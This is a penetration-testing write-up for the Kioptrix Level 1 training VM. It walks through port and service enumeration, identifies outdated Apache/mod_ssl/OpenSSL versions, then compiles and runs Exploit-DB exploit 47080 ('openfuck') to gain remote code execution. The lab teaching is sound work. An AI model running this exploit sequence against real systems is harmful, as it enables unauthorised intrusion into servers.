# Kioptrix Level 1 — Penetration Testing Write-up

## 1. Enumeration

The first step was to identify all exposed TCP services running on the target.

### 1.1 Full Port Scan

```bash
nmap -T4 -p- 192.168.56.101
```

### Findings

The scan identified the following open TCP ports:

|      Port | State | Service |
| --------: | ----- | ------- |
|    22/tcp | Open  | SSH     |
|    80/tcp | Open  | HTTP    |
|   111/tcp | Open  | RPC     |
|   139/tcp | Open  | SMB     |
|   443/tcp | Open  | HTTPS   |
| 32768/tcp | Open  | Status  |

---

## 2. Service & Version Enumeration

After identifying the open ports, I performed service/version detection and OS fingerprinting.

```bash
nmap -T4 -p 22,80,111,139,443,32768 -A 192.168.56.101
```

### Findings

#### SSH — Port 22

```text
OpenSSH 2.9p2
Server supports SSHv1
```

SSHv1 support was identified as an outdated and insecure configuration.

#### HTTP — Port 80

```text
Apache httpd 1.3.20
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

The server also appeared to allow the HTTP `TRACE` method.

#### RPC — Port 111

```text
rpcbind
```

#### SMB — Port 139

```text
Samba
```

#### HTTPS — Port 443

The service was running with an outdated SSL/TLS stack, including:

```text
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

SSLv2 support was also detected.

#### Status — Port 32768

```text
status
```

---

# 3. Web Enumeration

Since HTTP was exposed on port 80, I manually inspected the web server.

### 3.1 Default Web Page

URL:

```text
http://192.168.56.101/
```

### Finding

The server returned a default/test page indicating:

```text
Red Hat Linux
```

This provided additional information about the underlying operating system.

---

## 3.2 Apache Manual

I discovered that the Apache documentation was accessible.

URL:

```text
http://192.168.56.101/manual/
```

### Finding

The directory returned HTTP `200 OK` and exposed directory listings.

Example:

```text
/manual/mod/
```

Further enumeration revealed:

```text
mod_perl.html
mod_perl/
mod_ssl/
```

---

## 3.3 mod_ssl Documentation

URL:

```text
http://192.168.56.101/manual/mod/mod_ssl/
```

### Finding

The server exposed the `mod_ssl 2.8` documentation.

This was particularly interesting because the installed version of `mod_ssl` was significantly outdated and became a candidate for further vulnerability research.

---

# 4. HTTP Header Enumeration

I used `curl` to inspect the HTTP response headers.

```bash
curl -I http://192.168.56.101
```

### Findings

```text
Apache 1.3.20
RedHat
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

These results confirmed the versions discovered during Nmap enumeration.

---

# 5. Web Technology Fingerprinting

I used WhatWeb to fingerprint the web server.

```bash
whatweb http://192.168.56.101
```

### Findings

```text
Apache 1.3.20
mod_ssl 2.8.4
OpenSSL 0.9.6b
Red Hat Linux
```

The results were consistent with the previous enumeration.

---

# 6. Web Vulnerability Scanning

Next, I used Nikto to identify potentially vulnerable components and known issues.

```bash
nikto -h http://192.168.56.101
```

### Findings

The scan identified:

```text
Apache 1.3.20
Red-Hat/Linux
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

Nikto also reported potential vulnerabilities associated with the outdated software versions, including:

* `mod_ssl 2.8.4` — potential remote buffer overflow / possible remote shell
* `Apache 1.3.20` — potential buffer overflow issues involving `mod_rewrite` / `mod_cgi`

These findings made the Apache/mod_ssl stack a strong candidate for exploitation.

---

# 7. Targeted HTTP Version Enumeration

I performed a more focused Nmap version scan against the HTTP and HTTPS services.

```bash
nmap -T4 -sV -p 80,443 192.168.56.101
```

### Findings

```text
Apache 1.3.20
Red-Hat/Linux
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

This confirmed the previously identified versions.

---

# 8. SSL/TLS Enumeration

Finally, I enumerated the supported SSL/TLS protocols and cipher suites.

```bash
nmap --script ssl-enum-ciphers -p 443 192.168.56.101
```

### Findings

The server supported outdated protocols and cryptographic algorithms:

```text
SSLv3
TLS 1.0
RC4
MD5
```

The SSLv3 support was associated with:

```text
CVE-2014-3566
```

This vulnerability is commonly known as **POODLE**.

The presence of SSLv3, TLS 1.0, RC4, and MD5 further confirmed that the target was running a very old and insecure SSL/TLS configuration.

---

# 9. Enumeration Summary

At the end of the enumeration phase, the following attack surface had been identified:

| Service | Version / Finding     | Interest  |
| ------- | --------------------- | --------- |
| SSH     | OpenSSH 2.9p2 / SSHv1 | 🔴 High   |
| HTTP    | Apache 1.3.20         | 🔴 High   |
| HTTPS   | mod_ssl 2.8.4         | 🔴 High   |
| SSL     | OpenSSL 0.9.6b        | 🔴 High   |
| SMB     | Samba                 | 🟠 Medium |
| RPC     | rpcbind               | 🟠 Medium |
| Status  | port 32768            | 🟡 Low    |
| Web     | Apache manual exposed | 🟠 Medium |

The most interesting finding was the combination of:

```text
Apache 1.3.20
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

Given the age of these components and the vulnerabilities reported by the enumeration tools, I proceeded to investigate the available exploitation paths.

---

## 🛠️ Tools Used

* Nmap
* Nikto
* WhatWeb
* cURL
* Browser
* Nmap NSE — `ssl-enum-ciphers`

---

## 📌 Key Takeaways

* Always begin with a full TCP port scan.
* Perform version detection after identifying open ports.
* Web servers can reveal useful information through default pages and exposed documentation.
* HTTP headers can help confirm software versions.
* Automated tools such as Nikto and WhatWeb are useful for identifying potential attack vectors.
* SSL/TLS enumeration can reveal deprecated protocols and weak cryptographic algorithms.

# 10. Exploitation

During the enumeration phase, `mod_ssl 2.8.4` was identified as a potentially vulnerable component.

I used SearchSploit to search the local Exploit-DB database for known exploits targeting this version.

## 10.1 Search for a mod_ssl Exploit

```bash
searchsploit mod_ssl 2.8.4
```

The search returned an exploit associated with **Exploit-DB ID 47080**.

I then inspected the exploit entry:

```bash
searchsploit -p 47080
```

This showed the local path of the exploit source code.

---

## 10.2 Copy the Exploit

I copied the exploit source into the current working directory:

```bash
cp /usr/share/exploitdb/exploits/unix/remote/47080.c .
```

The exploit was written in C, so it needed to be compiled before execution.

---

## 10.3 Compile the Exploit

I compiled the exploit using GCC and linked it against OpenSSL's crypto library:

```bash
gcc -o openfuck 47080.c -lcrypto
```

This produced the executable:

```text
openfuck
```

---

## 10.4 Execute the Exploit

Running the binary without arguments displayed the available usage/options:

```bash
./openfuck
```

The exploit requires a specific target offset/return address configuration for the vulnerable `mod_ssl` version.

Based on the target's Apache/mod_ssl version and the exploit's supported targets, I selected the appropriate option:

```bash
./openfuck 0x6b 192.168.56.101 -c 40
```

Where:

* `0x6b` — selected exploit target/offset
* `192.168.56.101` — target IP address
* `-c 40` — exploit connection/configuration parameter

The exploit successfully targeted the vulnerable `mod_ssl 2.8.4` service.

---

## 10.5 Exploitation Result

The vulnerable `mod_ssl` installation provided a path to remote code execution on the target.

This demonstrated the importance of the version information discovered during enumeration:

```text
Apache 1.3.20
mod_ssl 2.8.4
OpenSSL 0.9.6b
```

The exploitation workflow was:

```text
Enumeration
    ↓
Identify mod_ssl 2.8.4
    ↓
Search Exploit-DB
    ↓
Find exploit 47080
    ↓
Copy exploit source
    ↓
Compile exploit
    ↓
Select appropriate target
    ↓
Execute against 192.168.56.101
    ↓
Remote Code Execution
```

### Exploitation Commands

```bash
searchsploit mod_ssl 2.8.4
searchsploit -p 47080

cp /usr/share/exploitdb/exploits/unix/remote/47080.c .

gcc -o openfuck 47080.c -lcrypto

./openfuck

./openfuck 0x6b 192.168.56.101 -c 40
```
